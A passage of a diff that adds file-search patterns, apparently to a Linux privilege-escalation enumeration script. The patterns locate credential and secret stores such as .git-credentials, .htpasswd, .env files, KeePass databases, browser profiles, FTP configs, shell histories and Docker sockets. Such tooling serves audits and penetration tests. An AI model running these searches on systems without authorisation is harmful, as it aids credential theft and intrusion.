+    PSTORAGE_GITLAB=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E '/lib' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "secrets\.yml$|gitlab\.yml$|gitlab\.rm$" | sort | uniq | head -n 70)
+    PSTORAGE_PGP_GPG=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -v -E 'README.gnupg' | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.pgp$|.*\.gpg$|.*\.gnupg$" | sort | uniq | head -n 70)
+    PSTORAGE_CACHE_VI=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.swp$|.*\.viminfo$" | sort | uniq | head -n 70)
+    PSTORAGE_DOCKER=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "docker\.socket$|docker\.sock$|Dockerfile$|docker-compose\.yml$" | sort | uniq | head -n 70)
+    PSTORAGE_FIREFOX=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^" | grep -E "\.mozilla$|Firefox$" | sort | uniq | head -n 70)
+    PSTORAGE_CHROME=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^" | grep -E "google-chrome$|Chrome$" | sort | uniq | head -n 70)
+    PSTORAGE_OPERA=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^" | grep -E "com\.operasoftware\.Opera$" | sort | uniq | head -n 70)
+    PSTORAGE_SAFARI=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^" | grep -E "Safari$" | sort | uniq | head -n 70)
+    PSTORAGE_AUTOLOGIN=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "autologin$|autologin\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_FASTCGI=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "fastcgi_params$" | sort | uniq | head -n 70)
+    PSTORAGE_SNMP=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "snmpd\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_PYPIRC=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.pypirc$" | sort | uniq | head -n 70)
+    PSTORAGE_POSTFIX=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "postfix$" | sort | uniq | head -n 70)
+    PSTORAGE_CLOUDFLARE=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.cloudflared$" | sort | uniq | head -n 70)
+    PSTORAGE_HISTORY=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\..*_history\..*$" | sort | uniq | head -n 70)
+    PSTORAGE_HTTP_CONF=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "httpd\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_HTPASSWD=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.htpasswd$" | sort | uniq | head -n 70)
+    PSTORAGE_LDAPRC=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.ldaprc$" | sort | uniq | head -n 70)
+    PSTORAGE_ENV=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.env$" | sort | uniq | head -n 70)
+    PSTORAGE_MSMTPRC=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.msmtprc$" | sort | uniq | head -n 70)
+    PSTORAGE_INFLUXDB=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "influxdb\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_ZABBIX=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "zabbix_server\.conf$|zabbix_agentd\.conf$|zabbix$" | sort | uniq | head -n 70)
+    PSTORAGE_GITHUB=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.github$|\.gitconfig$|\.git-credentials$|\.git$" | sort | uniq | head -n 70)
+    PSTORAGE_SVN=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.svn$" | sort | uniq | head -n 70)
+    PSTORAGE_KEEPASS=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.kdbx$|KeePass\.config.*$|KeePass\.ini$|KeePass\.enforced.*$" | sort | uniq | head -n 70)
+    PSTORAGE_FTP=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E ".*\.ftpconfig$|ffftp\.ini$|ftp\.ini$|ftp\.config$|sites\.ini$|wcx_ftp\.ini$|winscp\.ini$|ws_ftp\.ini$" | sort | uniq | head -n 70)
+    PSTORAGE_BIND=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/var|^/usr|^/etc" | grep -E "bind$" | sort | uniq | head -n 70)
+    PSTORAGE_SEEDDMS=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "seeddms.*$" | sort | uniq | head -n 70)
+    PSTORAGE_DDCLIENT=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "ddclient\.conf$" | sort | uniq | head -n 70)
+    PSTORAGE_KCPASSWORD=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "kcpassword$" | sort | uniq | head -n 70)
+    PSTORAGE_SENTRY=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM\n$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "sentry$|sentry\.conf\.py$" | sort | uniq | head -n 70)
+    PSTORAGE_STRAPI=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "environments$" | sort | uniq | head -n 70)
+    PSTORAGE_CACTI=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "cacti$" | sort | uniq | head -n 70)
+    PSTORAGE_ROUNDCUBE=$(echo "$FIND_DIR_MEDIA\n$FIND_DIR_CDROM\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_ETC\n$FIND_DIR_MNT\n$FIND_DIR_PRIVATE\n$FIND_DIR_APPLICATIONS\n$FIND_DIR_TMP\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_USR\n$FIND_DIR_BIN\n$FIND_DIR_SBIN\n$FIND_DIR_SNAP\n$FIND_DIR_OPT\n$FIND_DIR_SRV"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "roundcube$" | sort | uniq | head -n 70)
+    PSTORAGE_PASSBOLT=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "passbolt\.php$" | sort | uniq | head -n 70)
+    PSTORAGE_WGET=$(echo "$FIND_CACHE\n$FIND_HOMESEARCH\n$FIND_SYS\n$FIND_MEDIA\n$FIND_LIB32\n$FIND_TMP\n$FIND_APPLICATIONS\n$FIND_RUN\n$FIND_VAR\n$FIND_SRV\n$FIND_OPT\n$FIND_ETC\n$FIND_SNAP\n$FIND_BIN\n$FIND_SYSTEMD\n$FIND_MNT\n$FIND_PRIVATE\n$FIND_USR\n$FIND_SBIN\n$FIND_CDROM\n$FIND_LIB64\n$FIND_LIB\n$FIND_SYSTEM"  | grep -E "^/tmp|^/sbin|^/usr|^/var|^/bin|^/applications|^/.cache|^/etc|^/srv|^/private|^/snap|^/mnt|^/cdrom|^/media|^/opt|^$GREPHOMESEARCH" | grep -E "\.wgetrc$" | sort | uniq | head -n 70)
